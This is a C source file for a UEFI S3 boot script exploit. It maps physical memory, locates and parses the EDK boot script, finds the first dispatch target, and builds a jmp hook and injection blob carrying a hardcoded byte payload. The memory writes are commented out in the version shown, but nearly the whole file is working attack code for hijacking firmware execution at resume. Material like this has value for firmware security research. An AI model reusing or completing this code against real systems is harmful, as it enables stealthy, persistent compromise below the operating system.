/** \file
 *
 * This is for exploit bootscript
 *
 * (c) 2015 Trammell Hudson, JJH
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>
#include <strings.h>
#include <ctype.h>
#include <unistd.h>

#include <inttypes.h>
#include <capstone/capstone.h>

#include "DirectHW.h"

#define BOOT_SCRIPT_EDK_SIGN			'\xAA'
#define BOOT_SCRIPT_TABLE_HEADER_LEN	0x34

#define EFI_BOOT_SCRIPT_IO_WRITE_OPCODE 				0x00
#define EFI_BOOT_SCRIPT_IO_READ_WRITE_OPCODE			0x01
#define EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE				0x02
#define EFI_BOOT_SCRIPT_MEM_READ_WRITE_OPCODE			0x03
#define EFI_BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE 		0x04
#define	EFI_BOOT_SCRIPT_PCI_CONFIG_READ_WRITE_OPCODE	0x05
#define	EFI_BOOT_SCRIPT_SMBUS_EXECUTE_OPCODE			0x06
#define	EFI_BOOT_SCRIPT_STALL_OPCODE					0x07
#define	EFI_BOOT_SCRIPT_DISPATCH_OPCODE					0x08
#define	EFI_BOOT_SCRIPT_MEM_POLL_OPCODE					0x09

char bootscript_opcode[10][50] =	{	"EFI_BOOT_SCRIPT_IO_WRITE_OPCODE", "EFI_BOOT_SCRIPT_IO_READ_WRITE_OPCODE",
								"EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE", "EFI_BOOT_SCRIPT_MEM_READ_WRITE_OPCODE",
								"EFI_BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE", "EFI_BOOT_SCRIPT_PCI_CONFIG_READ_WRITE_OPCODE",
								"EFI_BOOT_SCRIPT_SMBUS_EXECUTE_OPCODE", "EFI_BOOT_SCRIPT_STALL_OPCODE",
								"EFI_BOOT_SCRIPT_DISPATCH_OPCODE", "EFI_BOOT_SCRIPT_MEM_POLL_OPCODE"	};
uint64_t dispatch_addr = 0;
uint8_t payload[9] = "\x66\xc7\x05\x04\xf8\xd1\xfe\x08\xf0";


static char printable( uint8_t c )
{
	if (isprint(c))
		return (char) c;
	return '.';
}

static void hexdump( const uintptr_t base_offset, const uint8_t * const buf, const size_t len )
{
	const size_t width = 16;

	for (size_t offset = 0 ; offset < len ; offset += width)
	{
		printf("%08"PRIxPTR":", base_offset + offset);
		for (size_t i = 0 ; i < width ; i++)
		{
			if (i + offset < len)
				printf(" %02x", buf[offset+i]);
			else
				printf("   ");
		}

		printf("  ");

		for (size_t i = 0 ; i < width ; i++)
		{
			if (i + offset < len)
				printf("%c", printable(buf[offset+i]));
			else
				printf(" ");
		}

		printf("\n");
	}
}


/*
 * Copy four bytes at a time, even if it spills over.
 * This will read from the PCI space safely, unlike mempcy().
 */
static void quad_memcpy( uint32_t * const out, const uint32_t * const in, size_t len)
{
	for (size_t i = 0 ; i < len ; i += 4)
	{
		out[i/4] = in[i/4];
	}
}

static void jjh_memcpy( uint8_t *out, uint8_t *in, size_t len )
{
	for( size_t i = 0 ; i < len ; i ++ )
	{
		out[i] = in[i];
	}
}

static void jjh_memset( uint8_t *out, uint8_t in_val, size_t len )
{
	for( size_t i = 0 ; i < len ; i ++ )
	{
		out[i] = in_val;
	}
}

int read_physical_map( uintptr_t addr, size_t len, void **out_buf )
{
	const uintptr_t page_mask = 0xFFF;
	const uintptr_t page_offset = addr & page_mask;
	const uintptr_t map_addr = addr & ~page_mask;
	const size_t map_len = (len + page_offset + page_mask) & ~page_mask;

	const uint8_t * const map_buf = map_physical(map_addr, map_len);
	if (map_buf == NULL)
	{
		perror("mmap");
		return EXIT_FAILURE;
	}

	const uint8_t * const buf = map_buf + page_offset;

	*out_buf = calloc( 1, len );
	if (!(*out_buf) )
	{
		perror("calloc");
		return EXIT_FAILURE;
	}
	jjh_memcpy( *out_buf, (const void*) buf, len );

	return EXIT_SUCCESS;
}

int write_physical_map( uintptr_t addr, size_t len, uint8_t *in_buf )
{
	const uintptr_t page_mask = 0xFFF;
	const uintptr_t page_offset = addr & page_mask;
	const uintptr_t map_addr = addr & ~page_mask;
	const size_t map_len = (len + page_offset + page_mask) & ~page_mask;

	volatile uint8_t * const buf = map_physical(map_addr, map_len);
	if (buf == NULL)
	{
		perror("mmap");
		return EXIT_FAILURE;
	}

	for (size_t i = 0 ; i < len ; i++)
		buf[i+page_offset] = in_buf[i];

	return EXIT_SUCCESS;
}

int parse_bootscript( void * bootscript )
{
	void *bs_descriptor = bootscript;;

	if( (*(char *)bs_descriptor++) == BOOT_SCRIPT_EDK_SIGN )
	{
		printf("This is EDK Boot Script\n");

		bs_descriptor += BOOT_SCRIPT_TABLE_HEADER_LEN;
		uint16_t op = 0;
		uint8_t size = 0;
		uint32_t width = 0;
		uint32_t count = 0;
		uint64_t addr = 0;
		uint32_t val = 0;

		while( op != 0xff )
		{
			op = *(uint16_t *)bs_descriptor;
			size = *(uint8_t *)(bs_descriptor+0x2);
			printf("opcode : %s, size : %d\n", bootscript_opcode[op], size);
			if( op == EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE )
			{
				width = *(uint32_t *)(bs_descriptor+0x3);
				count = *(uint32_t *)(bs_descriptor+0x7);
				addr = *(uint64_t *)(bs_descriptor+0xb);
				printf("width : 0x%x, count : 0x%x, addr : 0x%llx\n", width, count, addr);
				int i;
				for( i = 0; i < size; i++)
					printf("%02x ", *(uint8_t *)(bs_descriptor+i));
				printf("\n\n");
			}
			else if( op == EFI_BOOT_SCRIPT_MEM_READ_WRITE_OPCODE )
			{
				width = *(uint32_t *)(bs_descriptor+0x3);
				addr = *(uint64_t *)(bs_descriptor+0x7);
				printf("width : 0x%x, addr : 0x%llx\n", width, addr);
				int i;
				for( i = 0; i < size; i++)
					printf("%02x ", *(uint8_t *)(bs_descriptor+i));
				printf("\n\n");
			}
			else if( op == EFI_BOOT_SCRIPT_MEM_POLL_OPCODE )
			{
				int i;
				for( i = 0; i < size; i++)
					printf("%02x ", *(uint8_t *)(bs_descriptor+i));
				printf("\n\n");
				/*width = *(uint32_t *)(bs_descriptor+0x3);
				  addr = *(uint64_t *)(bs_descriptor+0x7);
				  duration = *(uint64_t *)(bs_descriptor+0xf);
				  loop = *(uint64_t *)(bs_descriptor+0x17)
				  printf("width : 0x%x, count : 0x%x, addr : 0x%x\n\n", width, count, addr);*/
			}
			else if( op == EFI_BOOT_SCRIPT_IO_READ_WRITE_OPCODE )
			{
				width = *(uint32_t *)(bs_descriptor+0x3);
				printf("width : 0x%x\n\n", width);
			}
			/*else if( op == EFI_BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE )
			  {
			  width, count = byte_at(data, 9), qword_at(data, 24)
			  addr = qword_at(data, 16)
			  bus, dev, fun, off = (addr >> 24) & 0xff, (addr >> 16) & 0xff, \
			  (addr >> 8) & 0xff,  (addr >> 0) & 0xff
			  values = self.read_values(data[32:], width, count)
			  self.process_pci_config_write(width, bus, dev, fun, off, count, values)
			  }*/
			/*else if( op == EFI_BOOT_SCRIPT_IO_WRITE_OPCODE )
			  {
			  width, count = byte_at(data, 9), qword_at(data, 16)
			  port = word_at(data, 10)
			  values = self.read_values(data[24:], width, count)
			  self.process_io_write(width, port, count, values)
			  }*/
			else if( op == EFI_BOOT_SCRIPT_DISPATCH_OPCODE )
			{
				addr = *(uint64_t *)(bs_descriptor+0x3);
				printf("addr : 0x%llx\n\n", addr);

				if( dispatch_addr == 0 )
					dispatch_addr = addr;
			}

			bs_descriptor += size;
		}
	}
	else
		printf("This is Intel Boot Script\n");

	return 0;
}

uint64_t find_inject_addr( uint64_t target_addr, size_t inject_len )
{
	size_t max_size = 0, page_size = 0x1000;
	uint64_t inject_addr = ( target_addr & 0xfffff000 ) + page_size - inject_len;
	uint8_t *inject_area = NULL;

	while( max_size < 1024 * 1024 )
	{
		read_physical_map( inject_addr, inject_len, (void **)(&inject_area) );
		printf("inspect address 0x%llx for injection...\n", inject_addr);
		for( size_t i = 0; i < inject_len; i++ )
			printf("%02x ", inject_area[i]);
		printf("\n\n");

		size_t i;
		for( i = 0; i < inject_len; i++ )
		{
			if( inject_area[i] != 0 )
				break;
		}
		if( i == inject_len )
		{
			printf("inject area found : 0x%llx\n",inject_addr);
			break;
		}

		inject_addr += page_size;
		max_size += page_size;
	}

	return inject_addr;
}

int build_jmp_insn( uint64_t src, uint64_t dst, uint8_t *insn )
{
	uint32_t jmp_offset = (dst - src - 0x5) & 0xffffffff;
	printf("jmp_offset : 0x%x\n\n",jmp_offset);
	*insn++ = '\xe9';
	*((uint32_t *)insn) = jmp_offset;
}

int hook_bootscript( uint64_t target_addr )
{
	printf("\n\ntarget addr = 0x%llx\n", target_addr);

	size_t len = 0x200;
	void *target_code = NULL;
	read_physical_map( target_addr, len, &target_code );

	csh handle;
	cs_insn *insn;
	size_t count, hook_size = 0, jmp_size = 5;

	if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK)
		return -1;
	count = cs_disasm(handle, target_code, len, 0, 0, &insn);
	if( count <= 0 )
	{
		printf("ERROR: Failed to disassemble given code!\n");
		return -1;
	}

	printf("backup this code for hoooking...\n");
	for (size_t i = 0; i < count; i++) {
		if( hook_size < jmp_size )
		{
			printf("0x%"PRIx64":\t%s\t\t%s\n", insn[i].address, insn[i].mnemonic, insn[i].op_str);
			hook_size += insn[i].size;
		}
		else
			break;
	}

	cs_free(insn, count);
	cs_close(&handle);

	uint8_t *backup_code = calloc(1, hook_size);
	if (!backup_code )
	{
		perror("calloc");
		return EXIT_FAILURE;
	}
	jjh_memcpy( backup_code, target_code, hook_size );

	uint8_t jmp_opcode = '\x90';
	uint8_t *jmp_insn = calloc(1, jmp_size);
	if (!jmp_insn )
	{
		perror("calloc");
		return EXIT_FAILURE;
	}

	uint64_t inject_addr = find_inject_addr( target_addr, sizeof(payload) + hook_size + jmp_size );

	build_jmp_insn( target_addr, inject_addr, jmp_insn );
	jjh_memcpy( target_code, jmp_insn, jmp_size );
	jjh_memset( target_code + jmp_size, jmp_opcode, hook_size - jmp_size );
	//write_physical_map( target_addr, hook_size, target_code );
	if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK)
		return -1;
	count = cs_disasm(handle, target_code, len, target_addr, 0, &insn);
	if( count <= 0 )
	{
		printf("ERROR: Failed to disassemble given code!\n");
		return -1;
	}
	for (size_t i = 0; i < count; i++) {
		printf("0x%"PRIx64":\t%s\t\t%s\n", insn[i].address, insn[i].mnemonic, insn[i].op_str);
	}
	cs_free(insn, count);
	cs_close(&handle);

	uint8_t *inject_code = calloc(1, sizeof(payload) + hook_size + jmp_size);
	if (!jmp_insn )
	{
		perror("calloc");
		return EXIT_FAILURE;
	}

	build_jmp_insn( inject_addr + sizeof(payload) + hook_size, target_addr + hook_size, jmp_insn );
	jjh_memcpy( inject_code, payload, sizeof(payload) );
	jjh_memcpy( inject_code + sizeof(payload), backup_code, hook_size );
	jjh_memcpy( inject_code + sizeof(payload) + hook_size, jmp_insn, jmp_size );
	//write_physical_map( inject_addr , sizeof(payload) + hook_size + jmp_size, inject_code );
	if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK)
		return -1;
	count = cs_disasm(handle, inject_code, sizeof(payload) + hook_size + jmp_size, inject_addr, 0, &insn);
	if( count <= 0 )
	{
		printf("ERROR: Failed to disassemble given code!\n");
		return -1;
	}
	for (size_t i = 0; i < count; i++) {
		printf("0x%"PRIx64":\t%s\t\t%s\n", insn[i].address, insn[i].mnemonic, insn[i].op_str);
	}
	cs_free(insn, count);
	cs_close(&handle);

	free( backup_code );
	free( jmp_insn );
	free( inject_code );

	return 0;
}


int main()
{
	if (iopl(0) < 0)
	{
		perror("iopl");
		return EXIT_FAILURE;
	}

	uintptr_t addr = 0x8cf8b000;
	//uintptr_t addr = 0ximac;
	size_t len = 0x20;
	void *acpiglobalvar_data = NULL;
	read_physical_map( addr, len, &acpiglobalvar_data );

	addr = ((uintptr_t *)acpiglobalvar_data)[0x3];
	len = 0x8000;
	void *bootscript_data = NULL;
	read_physical_map( addr, len, &bootscript_data );

	parse_bootscript( bootscript_data );
	hook_bootscript( dispatch_addr );

	free( acpiglobalvar_data );
	free( bootscript_data );

	return EXIT_SUCCESS;
}

/*
   if (do_ascii)
   {
   hexdump(addr, out_buf, len);
   } else {
   for(size_t offset = 0 ; offset < len ; )
   {
   const ssize_t rc = write(
   STDOUT_FILENO,
   out_buf + offset,
   len - offset
   );

   if (rc <= 0)
   {
   perror("write");
   return EXIT_FAILURE;
   }

   offset += rc;
   }
   }
 */
